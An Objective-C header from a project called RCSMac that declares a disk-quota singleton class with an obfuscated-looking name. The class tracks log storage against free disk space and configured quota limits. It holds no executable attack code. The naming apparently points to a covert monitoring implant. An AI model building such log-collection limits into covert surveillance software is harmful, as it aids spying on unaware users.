//
//  RCSMDiskQuota.h
//  RCSMac
//
//  Created by kiodo on 16/01/12.
//  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface __m_MDiskQuota : NSObject
{
  unsigned long long mDiskSize;
  unsigned long long mUsedDisk;
  unsigned long long mFreeDisk;
  
  UInt32 mUsed;
  
  NSNumber *mStartAction;
  NSNumber *mStopAction;
  
  // Used by quota events
  BOOL   mMaxQuotaTriggered;
  UInt32 mMaxLogQuota;

  // used by quota global config
  UInt32 mMinGlobalFreeDisk;
  UInt32 mMaxGlobalLogSize;
  
  BOOL mMaxGlobalQuotaReached;
}

@property (readwrite) BOOL mMaxQuotaTriggered;

+ (__m_MDiskQuota *)sharedInstance;
- (id)init;

- (void)decUsed:(UInt32)numBytes;
- (void)incUsed:(UInt32)numBytes;

- (void)calcQuotas;

- (UInt32)used;

- (void)setGlobalQuotaParam:(NSData*)confData;

- (void)setEventQuotaParam:(NSDictionary*)confDict
                 andAction:(NSNumber*)anAction;

- (BOOL)isQuotaReached;

- (void)checkQuotas;

@end
